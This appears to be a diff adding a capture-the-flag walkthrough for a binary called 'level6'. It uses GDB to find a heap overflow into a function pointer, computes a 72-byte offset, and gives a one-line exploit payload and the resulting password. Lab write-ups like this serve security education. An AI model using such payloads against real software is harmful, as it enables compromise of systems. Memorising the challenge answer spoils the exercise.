@@ -1,0 +1,20 @@
+Step 1: Analyze binary with GDB
+$ gdb ./level6
+(gdb) info functions        # Found n(), m(), main()
+(gdb) disassemble main      # Found heap allocation and strcpy()
+(gdb) disassemble n         # Found system() call - win condition
+(gdb) disassemble m         # Found puts() - normal function
+
+Step 2: Understand heap layout
+- First malloc(64): Buffer for user input
+- Second malloc(4): Function pointer initially pointing to m()
+- strcpy() allows overflow from 64-byte buffer into function pointer
+
+Step 3: Calculate overflow offset
+- 64 bytes buffer + 8 bytes heap metadata = 72 bytes to reach function pointer
+
+Step 4: Create exploit
+$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+
+Step 5: Got password directly
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
